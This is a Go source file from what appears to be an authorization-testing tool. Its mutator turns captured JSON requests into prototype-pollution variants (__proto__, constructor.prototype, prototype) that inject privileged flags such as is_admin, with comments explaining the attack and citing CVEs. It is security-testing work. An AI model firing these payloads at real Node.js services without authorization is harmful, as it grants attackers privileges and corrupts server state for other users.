package mutate

import (
	"encoding/json"
	"sort"
	"strings"

	"github.com/bugsyhewitt/possession/internal/model"
)

// PrototypePollution is the JavaScript prototype-pollution authz-bypass
// mutator. It targets the BOPLA-adjacent class where a Node.js / browser
// backend that deep-merges attacker-controlled JSON into a model (lodash
// `_.merge`, `_.defaultsDeep`, jQuery `$.extend(true, ...)`, mongoose,
// hand-rolled recursive Object.assign, and the entire family of "merge user
// input into config" helpers) walks past the `__proto__` / `constructor` /
// `prototype` keys it should be guarding and writes onto Object.prototype.
// Every subsequent object the process creates inherits the polluted
// properties, and a downstream authz check that reads — for example —
// `req.user.is_admin` finds `true` even though the request never legitimately
// granted it. CVE-2018-3721 (lodash), CVE-2019-10744 (lodash), CVE-2019-11358
// (jQuery), and the 2024 Express qs/parseUrl chains are the canonical
// references; the OWASP "Prototype Pollution Prevention" cheat sheet and the
// Snyk 2025 npm advisory landscape both rank it as the dominant access-control
// bypass vector for the Node.js ecosystem.
//
// Where MassAssign attacks *which top-level properties are bound* (a property
// named `is_admin` set on the model instance itself — server-side BOPLA at the
// object layer), PrototypePollution attacks *which properties every object in
// the runtime inherits* (the same `is_admin` flag set on Object.prototype, so
// every object answers `true` for it — runtime-wide privilege grant via a
// distinct merge-helper vulnerability class with a distinct fix). The two
// mutators are deliberately disjoint: MassAssign sets keys at the top level;
// PrototypePollution buries them under the three pollution-vector keys
// (`__proto__`, `constructor.prototype`, `prototype`) the prototype-walk
// guards are supposed to refuse. A server that blocks one will not necessarily
// block the other.
//
// PrototypePollution emits variants ONLY when the base request has a JSON
// *object* body (arrays, scalars, and non-JSON bodies are skipped — there is
// nothing for a JSON merge helper to recurse into). For each privileged
// property × each pollution vector, a separate variant is emitted so the
// comparative ladder can attribute a bypass to the specific shape that
// landed:
//
//   - `__proto__`: the direct, original Walmart-2018 / HackerOne vector — the
//     attacker key is the literal `__proto__` reserved name a naive recursive
//     merge follows without guarding.
//   - `constructor.prototype`: the indirect vector that bypasses guards which
//     check only for `__proto__` — every object's `constructor` is a function
//     whose `.prototype` IS Object.prototype, so writing into
//     `obj.constructor.prototype.is_admin` has the same effect.
//   - `prototype`: the surface-level alias used by libraries (mongoose,
//     handlebars, some hand-rolled merges) that walk a key literally named
//     `prototype` thinking it is just data — a third pathway documented in
//     the npm-ecosystem CVE chain.
//
// Every variant keeps the caller's own credentials (Identity == nil — the
// replay engine keeps the captured auth as-is). The original top-level fields
// of the body are preserved verbatim; the pollution payload is *added*
// alongside them. The injected privileged value matches the MassAssign
// canonical set (`PrivilegedProperties`) so the same authz-bypass surface
// (admin, role, is_admin, isAdmin, verified, roles) is exercised against the
// prototype layer.
//
// Like every mutator, Generate is pure and deterministic: properties are
// applied in canonical (sorted-by-PrivilegedProperties.Key) order, vectors are
// emitted in a fixed (sorted by vector name) sequence, so identical inputs
// yield an identical variant slice.
//
// PrototypePollution is OFF by default (Enabled == false). The polluted JSON
// reaches deep-merge code paths whose effect is process-wide (the entire
// Node.js process answers the polluted property thereafter — including for
// other concurrent users), so it only fires when the operator explicitly opts
// in via --prototype-pollution. This mirrors the off-by-default gating of
// MassAssign (BOPLA at the object layer), XXE (parser probing), and every
// other write-shaped mutator.
type PrototypePollution struct {
	Enabled bool
}

func (PrototypePollution) Name() string { return "prototype-pollution" }

// pollutionVectors is the canonical, sorted list of prototype-pollution key
// shapes. Each vector describes how to bury a {key: value} payload inside the
// request body so a recursive-merge helper writes the payload onto
// Object.prototype rather than onto the model instance. Kept in
// alphabetical-by-name order so generation is deterministic without an
// at-call-site sort; the determinism test covers this.
var pollutionVectors = []struct {
	// Name is the short identifier emitted in the mutation Detail under
	// "vector" — used by the reporter and the allowlist to attribute and
	// suppress a finding to the specific pollution shape.
	Name string
	// Build wraps {key: value} into the pollution payload that gets merged
	// at the *top level* of the request body. The returned map is the
	// fragment to add (not the whole body).
	Build func(key string, value interface{}) map[string]interface{}
}{
	// constructor.prototype: writes through every object's constructor
	// function's .prototype, which IS Object.prototype. Bypasses guards
	// that block only the literal "__proto__" key.
	{
		Name: "constructor.prototype",
		Build: func(key string, value interface{}) map[string]interface{} {
			return map[string]interface{}{
				"constructor": map[string]interface{}{
					"prototype": map[string]interface{}{
						key: value,
					},
				},
			}
		},
	},
	// __proto__: the direct, original CVE-2018-3721 vector. Naive
	// recursive-merge helpers follow the literal "__proto__" key into
	// Object.prototype.
	{
		Name: "__proto__",
		Build: func(key string, value interface{}) map[string]interface{} {
			return map[string]interface{}{
				"__proto__": map[string]interface{}{
					key: value,
				},
			}
		},
	},
	// prototype: the bare alias used by mongoose / handlebars / some
	// hand-rolled merges that walk a key literally named "prototype" as
	// data. A third pathway documented across the npm-ecosystem CVE chain.
	{
		Name: "prototype",
		Build: func(key string, value interface{}) map[string]interface{} {
			return map[string]interface{}{
				"prototype": map[string]interface{}{
					key: value,
				},
			}
		},
	},
}

func (pp PrototypePollution) Generate(base *model.CapturedRequest, _ *model.RoleMatrix) []model.Variant {
	if !pp.Enabled || base == nil {
		return nil
	}
	if len(base.Body) == 0 || !looksJSON(base.ContentType, base.Body) {
		return nil
	}

	// The body must be a JSON object — prototype pollution rides a recursive
	// merge of attacker JSON into a server-side object, which only happens
	// for an object payload (arrays and scalars are not recursed into).
	var doc map[string]interface{}
	if err := json.Unmarshal(base.Body, &doc); err != nil {
		return nil
	}

	// Sort the privileged-property set so emission order is deterministic
	// regardless of the order they were declared in PrivilegedProperties.
	// MassAssign already does this; we mirror it so the two mutators agree
	// on the same canonical sweep order.
	props := append([]PrivilegedProperty(nil), PrivilegedProperties...)
	sort.Slice(props, func(i, j int) bool { return props[i].Key < props[j].Key })

	// Sort vectors by Name for the same reason. They are already declared
	// in alphabetical order above, but sorting at call time keeps the
	// determinism contract robust against future edits.
	vectors := append([]struct {
		Name  string
		Build func(string, interface{}) map[string]interface{}
	}(nil), pollutionVectors...)
	sort.Slice(vectors, func(i, j int) bool { return vectors[i].Name < vectors[j].Name })

	// doc is already parsed above; pass it to injectPollutionFrom to avoid
	// re-unmarshaling base.Body for each of the (props × vectors) variants.
	out := make([]model.Variant, 0, len(props)*len(vectors))
	for _, p := range props {
		for _, v := range vectors {
			polluted := injectPollutionFrom(doc, v.Build(p.Key, p.Value))
			if polluted == nil {
				continue
			}
			req := CloneRequest(base)
			req.Body = polluted

			out = append(out, model.Variant{
				Base:     req,
				Identity: nil, // credentials unchanged — caller stays the captured owner
				Mutation: model.Mutation{
					Type: "prototype-pollution",
					Description: "inject prototype-pollution payload " +
						v.Name + "." + p.Key + " into request body",
					Detail: map[string]string{
						"vector": v.Name,
						"field":  p.Key,
						"value":  stringifyJSON(p.Value),
					},
					Class: "privesc",
				},
			})
		}
	}
	return out
}

// injectPollution parses body as a JSON object, merges the pollution payload
// at the top level (without overwriting any of the caller's existing keys —
// the caller's legitimately-set values must be preserved verbatim so a server
// reading them still passes its own bookkeeping), and re-marshals. Returns
// nil on any parse/marshal failure. The re-marshal sorts object keys
// (encoding/json marshals map keys sorted), so the output is deterministic.
func injectPollution(body []byte, payload map[string]interface{}) []byte {
	var doc map[string]interface{}
	if err := json.Unmarshal(body, &doc); err != nil {
		return nil
	}
	return injectPollutionFrom(doc, payload)
}

// injectPollutionFrom merges the pollution payload into a shallow copy of
// base, guarding against overwriting any of the caller's existing keys, and
// marshals the result. Splitting the parse step out lets Generate unmarshal
// the body once and reuse the parsed doc across all (property × vector)
// iterations instead of re-parsing per variant.
//
// Case-sensitive key guard: __proto__ / constructor / prototype are JavaScript
// reserved names; the JSON merge layer compares them literally. We also guard
// the lower-cased form to catch any ambiguous caller-supplied keys.
func injectPollutionFrom(base map[string]interface{}, payload map[string]interface{}) []byte {
	// Shallow copy so mutations don't bleed across loop iterations.
	doc := make(map[string]interface{}, len(base)+len(payload))
	for k, v := range base {
		doc[k] = v
	}
	// Add each pollution-payload top-level key alongside the caller's
	// existing keys. We do NOT overwrite an existing key — if the caller
	// already sends, say, "__proto__" themselves (vanishingly rare in real
	// traffic), the test proves nothing, so skip the variant by returning
	// nil.
	for k := range payload {
		if _, exists := doc[strings.ToLower(k)]; exists {
			return nil
		}
		if _, exists := doc[k]; exists {
			return nil
		}
	}
	for k, v := range payload {
		doc[k] = v
	}
	out, err := json.Marshal(doc)
	if err != nil {
		return nil
	}
	return out
}
